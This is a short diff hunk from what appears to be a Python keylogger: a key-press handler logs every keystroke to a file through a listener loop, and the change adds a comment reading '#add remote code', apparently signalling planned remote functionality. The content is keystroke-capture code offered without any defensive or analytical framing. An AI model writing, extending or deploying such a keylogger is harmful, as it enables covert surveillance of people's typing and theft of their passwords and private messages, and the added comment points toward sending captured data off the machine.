@@ -6,3 +6,4 @@ def on_press(key):
     logging.info(str(key))      #save every key on press
 with Listener(on_press=on_press) as listener:
     listener.join()
+#add remote code
